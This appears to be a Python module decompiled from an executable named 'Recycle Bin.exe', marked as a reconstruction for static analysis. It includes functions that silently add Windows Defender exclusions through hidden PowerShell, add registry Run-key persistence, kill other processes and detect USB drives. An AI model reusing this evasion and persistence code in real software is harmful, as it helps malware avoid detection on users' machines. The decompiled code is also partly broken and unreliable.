"""휴지통.exe / common 모듈 Python 3.10 bytecode 수동 복원.
원본 소스 파일은 아님. 정적 분석용으로 취급할 것.
"""
import os
import psutil
import sys
from datetime import datetime, timedelta
import subprocess
import requests


def get_program_info(program_name):
    try:
        from isc_server import get_version
        program_version = get_version(program_name)
        print(f'프로그램 버전 : {program_version}')
        current_script_path = sys.argv[0]
        current_script_filename = os.path.basename(current_script_path)
        print('현재 실행 중인 프로그램 경로:', current_script_path)
        print('현재 실행 중인 프로그램 명:', current_script_filename)
        program_info = {
            'program_version': program_version,
            'program_path': current_script_path,
            'program_filename': current_script_filename,
        }
        return program_info
    finally:
        pass


def get_danger_detection_status():
    is_danger = False
    current_script_path = sys.executable
    current_drive = os.path.splitdrive(current_script_path)[0]
    usb_devices = []
    for part in psutil.disk_partitions():
        if current_drive not in part.device and (
                'removable' in part.opts or 'cdrom' in part.opts):
            usb_devices.append(part.device)
    for device in usb_devices:
        usage = psutil.disk_usage(device)
        if usage.total <= 137438953472:
            print(f'USB 디바이스 {device} ({usage.total / 1073741824:.2f}GB)가 꽂혀 있습니다.')
            is_danger = True
    return is_danger


def is_admin():
    import platform
    os_kind = platform.system()
    if os_kind == 'Windows':
        import ctypes
        try:
            if ctypes.windll.shell32.IsUserAnAdmin():
                return True
            return False
        finally:
            pass
    if os_kind == 'Darwin':
        return os.getuid() == 0
    print('Unsupported operating system.')
    return False


def check_and_terminate_process(process_name, max_execution_time=10, is_process_check=False):
    own_pid = os.getpid()
    current_time = datetime.now()
    for proc in psutil.process_iter(attrs=['pid', 'name', 'create_time']):
        try:
            if proc.info['name'] == process_name and proc.info['pid'] != own_pid:
                process_create_time = datetime.fromtimestamp(proc.info['create_time'])
                process_execution_time = current_time - process_create_time
                if is_process_check:
                    pass
                proc.terminate()
        finally:
            pass


def add_windows_defender_exclusion(path):
    try:
        if check_windows_defender_exclusion(path):
            return
        command = f'"Add-MpPreference -ExclusionPath {path} -Force"'
        result = subprocess.Popen([
            'powershell', '-NoLogo', '-NonInteractive', '-WindowStyle',
            'hidden', '-NoProfile', '-Command', command,
        ], shell=True)
        print(f'{path}이(가) Windows Defender 예외 경로로 추가되었습니다.')
    finally:
        pass


def check_windows_defender_exclusion(path):
    command = f'"(Get-MpPreference).ExclusionPath -contains {path}"'
    try:
        result = subprocess.Popen([
            'powershell', '-NoLogo', '-NonInteractive', '-WindowStyle',
            'hidden', '-NoProfile', '-Command', command,
        ], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = result.communicate()
        if stdout.strip() == b'True':
            print(f'"Exclusion path {path}" found in Windows Defender settings.')
            return True
        print(f'"Exclusion path {path}" not found in Windows Defender settings.')
        return False
    finally:
        pass


def write_to_txt_file(filepath, content):
    try:
        with open(filepath, 'w', encoding='utf-8') as file:
            file.write(content)
    finally:
        pass


def read_from_txt_file(filepath):
    try:
        with open(filepath, 'r', encoding='utf-8') as file:
            content = file.read()
        # 원본 bytecode 에는 return content 가 없었음
    finally:
        pass


def remove_from_startup_registry(key_name):
    try:
        import winreg
        key_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_ALL_ACCESS) as key:
            winreg.DeleteValue(key, key_name)
            print(f'{key_name}이(가) 로컬 머신 시작 프로그램에서 성공적으로 제거되었습니다.')
    finally:
        pass


def add_to_startup_registry(exe_path, key_name):
    try:
        import winreg
        key_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_ALL_ACCESS) as key:
            winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, exe_path)
            print(f'{key_name}이(가) 시작 프로그램에 성공적으로 등록되었습니다.')
    finally:
        pass


def get_public_ip():
    try:
        response = requests.get('https://checkip.amazonaws.com')
        public_ip = response.text.strip()
        return public_ip
    finally:
        pass
